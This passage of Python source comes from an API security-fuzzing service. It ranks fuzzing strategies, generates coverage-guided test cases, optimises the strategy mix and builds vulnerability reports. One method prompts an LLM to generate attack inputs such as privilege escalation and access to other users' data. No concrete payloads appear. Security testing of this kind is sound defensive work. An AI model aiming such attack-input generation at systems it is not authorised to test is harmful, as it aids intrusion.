            effective_strategies = sorted(
                strategy_results.items(),
                key=lambda x: x[1]["effectiveness_score"],
                reverse=True
            )
            
            return {
                "analysis_summary": {
                    "total_fuzzing_tests": total_tests,
                    "total_vulnerabilities": total_vulnerabilities,
                    "vulnerability_discovery_rate": vulnerability_rate * 100,
                    "strategies_tested": len(strategy_results)
                },
                "strategy_effectiveness": strategy_results,
                "rankings": {
                    "most_effective_strategy": effective_strategies[0][0] if effective_strategies else None,
                    "strategy_rankings": [
                        {
                            "strategy": strategy,
                            "effectiveness_score": data["effectiveness_score"],
                            "vulnerability_rate": data["vulnerabilities_found"] / data["total_tests"] if data["total_tests"] > 0 else 0
                        }
                        for strategy, data in effective_strategies
                    ]
                },
                "recommendations": self._generate_fuzzing_recommendations(strategy_results, vulnerability_rate)
            }
            
        except Exception as e:
            logger.error(f"Fuzzing effectiveness analysis failed: {str(e)}")
            return {"error": str(e)}
    
    def _generate_fuzzing_recommendations(
        self, 
        strategy_results: Dict[str, Any], 
        overall_vulnerability_rate: float
    ) -> List[str]:
        """Generate recommendations based on fuzzing analysis."""
        
        recommendations = []
        
        # Overall vulnerability rate recommendations
        if overall_vulnerability_rate > 0.1:  # > 10%
            recommendations.append(f"HIGH ALERT: {overall_vulnerability_rate:.1%} vulnerability discovery rate indicates serious security issues")
        elif overall_vulnerability_rate > 0.05:  # > 5%
            recommendations.append(f"MODERATE CONCERN: {overall_vulnerability_rate:.1%} vulnerability rate suggests security review needed")
        elif overall_vulnerability_rate == 0:
            recommendations.append("No vulnerabilities found - good security posture")
        
        # Strategy-specific recommendations
        for strategy, results in strategy_results.items():
            effectiveness = results["effectiveness_score"]
            
            if effectiveness > 50:
                recommendations.append(f"Strategy '{strategy}' is highly effective - increase usage")
            elif effectiveness < 10 and results["total_tests"] > 5:
                recommendations.append(f"Strategy '{strategy}' shows low effectiveness - consider tuning or replacement")
            
            # Unexpected successes are concerning
            if results["unexpected_successes"] > 0:
                rate = results["unexpected_successes"] / results["total_tests"]
                if rate > 0.3:
                    recommendations.append(f"Strategy '{strategy}' has {rate:.1%} unexpected successes - potential security gaps")
        
        # Performance recommendations
        slow_strategies = [
            strategy for strategy, results in strategy_results.items()
            if results.get("avg_response_time", 0) > 5000
        ]
        if slow_strategies:
            recommendations.append(f"Strategies causing slow responses: {', '.join(slow_strategies)} - may indicate DoS vulnerabilities")
        
        return recommendations
    
    async def generate_coverage_guided_fuzzing(
        self,
        api_spec_id: int,
        coverage_gaps: Dict[str, Any],
        target_count: int = 100
    ) -> List[TestCase]:
        """Generate fuzzing test cases guided by coverage analysis."""
        
        try:
            # Focus on uncovered endpoints and parameters
            uncovered_endpoints = coverage_gaps.get("uncovered_endpoints", [])
            parameter_gaps = coverage_gaps.get("parameter_gaps", {})
            
            generated_tests = []
            
            # Generate fuzzing for uncovered endpoints
            for endpoint_method in uncovered_endpoints[:10]:  # Limit to top 10
                try:
                    method, endpoint = endpoint_method.split(" ", 1)
                    
                    # Generate focused fuzzing for this endpoint
                    endpoint_tests = await self.generate_fuzzed_test_cases(
                        api_spec_id=api_spec_id,
                        endpoint=endpoint,
                        method=method,
                        fuzzing_strategies=[FuzzingStrategy.ADVERSARIAL_INPUTS, FuzzingStrategy.STRING_INJECTION],
                        payload_count=min(10, target_count // len(uncovered_endpoints)),
                        use_llm=True
                    )
                    generated_tests.extend(endpoint_tests)
                    
                except ValueError as e:
                    logger.warning(f"Failed to generate fuzzing for {endpoint_method}: {str(e)}")
            
            # Generate fuzzing for endpoints with parameter gaps
            for endpoint_key, gap_info in list(parameter_gaps.items())[:5]:  # Top 5 gaps
                try:
                    method, endpoint = endpoint_key.split(" ", 1)
                    
                    # Focus on untested parameters
                    parameter_tests = await self.generate_fuzzed_test_cases(
                        api_spec_id=api_spec_id,
                        endpoint=endpoint,
                        method=method,
                        fuzzing_strategies=[FuzzingStrategy.BOUNDARY_VALUES, FuzzingStrategy.TYPE_CONFUSION],
                        payload_count=min(8, target_count // len(parameter_gaps)),
                        use_llm=False  # Use deterministic for parameter-specific fuzzing
                    )
                    generated_tests.extend(parameter_tests)
                    
                except ValueError as e:
                    logger.warning(f"Failed to generate parameter fuzzing for {endpoint_key}: {str(e)}")
            
            return generated_tests[:target_count]
            
        except Exception as e:
            logger.error(f"Coverage-guided fuzzing failed: {str(e)}")
            return []
    
    async def adaptive_fuzzing_optimization(
        self,
        api_spec_id: int,
        execution_history: List[Dict[str, Any]],
        optimization_target: str = "vulnerability_discovery"
    ) -> Dict[str, Any]:
        """Optimize fuzzing strategies based on historical effectiveness."""
        
        try:
            # Analyze historical effectiveness
            effectiveness_analysis = await self.analyze_fuzzing_effectiveness(
                api_spec_id, [h["session_id"] for h in execution_history]
            )
            
            strategy_rankings = effectiveness_analysis.get("rankings", {}).get("strategy_rankings", [])
            
            if not strategy_rankings:
                return {
                    "message": "No fuzzing history available for optimization",
                    "optimized_strategy_mix": []
                }
            
            # Optimize strategy selection based on target
            if optimization_target == "vulnerability_discovery":
                # Prioritize strategies that find vulnerabilities
                optimal_strategies = [
                    s for s in strategy_rankings 
                    if s["vulnerability_rate"] > 0.05  # > 5% vulnerability rate
                ]
            elif optimization_target == "coverage_expansion":
                # Prioritize strategies that improve coverage
                optimal_strategies = strategy_rankings  # All strategies can improve coverage
            else:
                # Balanced approach
                optimal_strategies = [
                    s for s in strategy_rankings
                    if s["effectiveness_score"] > 20
                ]
            
            # Create optimized strategy mix
            strategy_mix = []
            total_weight = 100
            
            for i, strategy_info in enumerate(optimal_strategies[:5]):  # Top 5 strategies
                # Assign weights based on effectiveness
                weight = max(10, int(strategy_info["effectiveness_score"] / 10))
                if i == 0:  # Top strategy gets extra weight
                    weight *= 2
                
                strategy_mix.append({
                    "strategy": strategy_info["strategy"],
                    "weight": min(weight, total_weight),
                    "effectiveness_score": strategy_info["effectiveness_score"],
                    "recommended_payload_count": max(5, weight // 5)
                })
                
                total_weight -= weight
                if total_weight <= 0:
                    break
            
            # Add default strategies if none were effective
            if not strategy_mix:
                strategy_mix = [
                    {
                        "strategy": "boundary_values",
                        "weight": 40,
                        "effectiveness_score": 30,
                        "recommended_payload_count": 15
                    },
                    {
                        "strategy": "string_injection", 
                        "weight": 35,
                        "effectiveness_score": 25,
                        "recommended_payload_count": 12
                    },
                    {
                        "strategy": "type_confusion",
                        "weight": 25,
                        "effectiveness_score": 20,
                        "recommended_payload_count": 8
                    }
                ]
            
            return {
                "optimization_target": optimization_target,
                "optimized_strategy_mix": strategy_mix,
                "optimization_rationale": self._explain_optimization_rationale(strategy_mix, strategy_rankings),
                "expected_improvement": self._estimate_improvement(strategy_mix, strategy_rankings)
            }
            
        except Exception as e:
            logger.error(f"Fuzzing optimization failed: {str(e)}")
            return {"error": str(e)}
    
    def _explain_optimization_rationale(
        self, 
        strategy_mix: List[Dict[str, Any]], 
        historical_rankings: List[Dict[str, Any]]
    ) -> str:
        """Explain why these strategies were chosen."""
        
        if not strategy_mix:
            return "No effective strategies found in historical data"
        
        top_strategy = strategy_mix[0]
        rationale_parts = [
            f"Optimized fuzzing strategy based on historical effectiveness analysis.",
            f"Top strategy '{top_strategy['strategy']}' selected with {top_strategy['weight']}% weight due to effectiveness score of {top_strategy['effectiveness_score']}."
        ]
        
        if len(strategy_mix) > 1:
            rationale_parts.append(f"Secondary strategies include {', '.join(s['strategy'] for s in strategy_mix[1:3])} for comprehensive coverage.")
        
        # Add specific insights
        high_performers = [s for s in historical_rankings if s["vulnerability_rate"] > 0.1]
        if high_performers:
            rationale_parts.append(f"Strategies with >10% vulnerability discovery rate: {', '.join(s['strategy'] for s in high_performers)}.")
        
        return " ".join(rationale_parts)
    
    def _estimate_improvement(
        self, 
        strategy_mix: List[Dict[str, Any]], 
        historical_rankings: List[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """Estimate expected improvement from optimization."""
        
        if not strategy_mix or not historical_rankings:
            return {"vulnerability_discovery": 0, "coverage_improvement": 0}
        
        # Calculate weighted average effectiveness
        total_weight = sum(s["weight"] for s in strategy_mix)
        weighted_effectiveness = sum(
            s["effectiveness_score"] * s["weight"] for s in strategy_mix
        ) / total_weight if total_weight > 0 else 0
        
        # Estimate improvements
        baseline_effectiveness = sum(s["effectiveness_score"] for s in historical_rankings) / len(historical_rankings) if historical_rankings else 20
        
        improvement_factor = weighted_effectiveness / baseline_effectiveness if baseline_effectiveness > 0 else 1.5
        
        return {
            "vulnerability_discovery": min(improvement_factor * 100, 300),  # Cap at 300% improvement
            "coverage_improvement": min(improvement_factor * 50, 150),     # Cap at 150% improvement
            "confidence": "high" if improvement_factor > 1.3 else "medium" if improvement_factor > 1.1 else "low"
        }
    
    async def generate_semantic_fuzzing(
        self,
        api_spec_id: int,
        endpoint: str,
        method: str,
        business_context: str,
        payload_count: int = 20
    ) -> List[FuzzedPayload]:
        """Generate semantically-aware fuzzing based on business context."""
        
        if not self.openai_client:
            logger.warning("LLM not available for semantic fuzzing")
            return []
        
        try:
            prompt = f"""
Generate {payload_count} semantically-aware fuzzing inputs for this API endpoint:

ENDPOINT: {method} {endpoint}
BUSINESS CONTEXT: {business_context}

Generate inputs that understand the business domain and could break business logic:

1. **Domain-specific edge cases** (e.g., negative prices, future dates in the past, invalid states)
2. **Business logic violations** (e.g., ordering before payment, deleting active resources)  
3. **Data consistency breaks** (e.g., totals not matching items, invalid relationships)
4. **Workflow violations** (e.g., steps out of order, missing prerequisites)
5. **Authorization edge cases** (e.g., accessing others' data, privilege escalation)

For each input, provide:
- The actual fuzzed value
- What business rule it's trying to break
- Expected system behavior
- Risk assessment

Return JSON array:
[
  {{
    "fuzzed_value": "actual value",
    "business_rule_targeted": "what rule this tries to break",
    "expected_outcome": "what should happen",
    "risk_level": "low|medium|high", 
    "description": "why this input is interesting"
  }}
]

Focus on realistic inputs that a malicious user might try!
"""
            
            response = self.openai_client.chat.completions.create(
                model=os.getenv("OPENAI_MODEL", "gpt-4"),
                messages=[
                    {
                        "role": "system",
                        "content": "You are a security researcher specializing in business logic vulnerabilities. Generate realistic attack inputs that understand the domain context."
                    },
                    {"role": "user", "content": prompt}
                ],
                temperature=0.9,  # High temperature for creative fuzzing
                max_tokens=2000
            )
            
            content = response.choices[0].message.content
            payload_data = self._parse_semantic_fuzzing_response(content, endpoint, method)
            
            return payload_data
            
        except Exception as e:
            logger.error(f"Semantic fuzzing generation failed: {str(e)}")
            return []
    
    def _parse_semantic_fuzzing_response(
        self, 
        content: str, 
        endpoint: str, 
        method: str
    ) -> List[FuzzedPayload]:
        """Parse semantic fuzzing response."""
        
        try:
            start_idx = content.find('[')
            end_idx = content.rfind(']') + 1
            
            if start_idx != -1 and end_idx > start_idx:
                json_str = content[start_idx:end_idx]
                payload_data = json.loads(json_str)
                
                payloads = []
                for i, item in enumerate(payload_data):
                    payload_id = f"semantic_{endpoint.replace('/', '_')}_{method}_{i}"
                    
                    payload = FuzzedPayload(
                        payload_id=payload_id,
                        original_value="normal_value",
                        fuzzed_value=item.get("fuzzed_value"),
                        strategy=FuzzingStrategy.SEMANTIC_FUZZING,
                        payload_type=None,
                        expected_outcome=item.get("expected_outcome", "business_logic_error"),
                        risk_level=item.get("risk_level", "medium"),
                        description=f"Semantic attack: {item.get('description', '')}"
                    )
                    payloads.append(payload)
                
                return payloads
            
        except (json.JSONDecodeError, KeyError) as e:
            logger.warning(f"Failed to parse semantic fuzzing response: {str(e)}")
        
        return []
    
    def create_fuzzing_report(
        self,
        fuzzing_results: Dict[str, Any],
        vulnerability_findings: List[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """Create comprehensive fuzzing report."""
        
        try:
            # Categorize findings by severity
            findings_by_severity = {"critical": [], "high": [], "medium": [], "low": []}
            
            for finding in vulnerability_findings:
                severity = finding.get("severity", "medium")
                findings_by_severity[severity].append(finding)
            
            # Calculate risk score
            risk_score = (
                len(findings_by_severity["critical"]) * 10 +
                len(findings_by_severity["high"]) * 5 +
                len(findings_by_severity["medium"]) * 2 +
                len(findings_by_severity["low"]) * 1
            )
            
            # Generate executive summary
            total_findings = len(vulnerability_findings)
            critical_count = len(findings_by_severity["critical"])
            
            if critical_count > 0:
                risk_level = "CRITICAL"
                summary = f"{critical_count} critical vulnerabilities require immediate attention"
            elif len(findings_by_severity["high"]) > 2:
                risk_level = "HIGH"
                summary = f"Multiple high-severity issues found - security review recommended"
            elif total_findings > 5:
                risk_level = "MEDIUM"
                summary = f"Several security issues identified - remediation needed"
            else:
                risk_level = "LOW"
                summary = "Limited security issues found - good overall security posture"
            
            return {
                "executive_summary": {
                    "risk_level": risk_level,
                    "summary": summary,
                    "total_vulnerabilities": total_findings,
                    "risk_score": risk_score
                },
                "findings_breakdown": findings_by_severity,
                "fuzzing_statistics": fuzzing_results.get("analysis_summary", {}),
                "strategy_effectiveness": fuzzing_results.get("strategy_effectiveness", {}),
                "top_recommendations": [
                    "Address critical vulnerabilities immediately",
                    "Implement additional input validation",
                    "Review security controls",
                    "Conduct manual security testing",
                    "Improve error handling"
                ][:3 + critical_count],  # More recommendations for more critical issues
                "next_steps": self._generate_next_steps(risk_level, findings_by_severity)
            }
            
        except Exception as e:
            logger.error(f"Failed to create fuzzing report: {str(e)}")
            return {"error": str(e)}
    
    def _generate_next_steps(
        self, 
        risk_level: str, 
        findings_by_severity: Dict[str, List[Dict[str, Any]]]
    ) -> List[str]:
        """Generate next steps based on fuzzing results."""
        
        next_steps = []
        
        if risk_level == "CRITICAL":
            next_steps.extend([
                "1. IMMEDIATE: Stop production deployment until critical issues are fixed",
                "2. URGENT: Patch critical vulnerabilities within 24 hours",
                "3. Conduct emergency security review",
                "4. Notify security team and stakeholders"
            ])
        elif risk_level == "HIGH":
            next_steps.extend([
                "1. Prioritize high-severity fixes in current sprint",
                "2. Increase security testing frequency",
                "3. Review input validation mechanisms",
                "4. Consider penetration testing"
            ])
        elif risk_level == "MEDIUM":
            next_steps.extend([
                "1. Address medium-severity issues in next sprint",
                "2. Enhance automated security testing",
                "3. Review error handling patterns",
                "4. Update security guidelines"
            ])
        else:
            next_steps.extend([
                "1. Continue regular security testing",
                "2. Monitor for new vulnerability patterns",
                "3. Maintain current security practices",
                "4. Consider expanding fuzzing coverage"
            ])
        
        return next_steps
    
    def __del__(self):
        """Clean up database session."""
        if hasattr(self, 'db'):
            self.db.close()
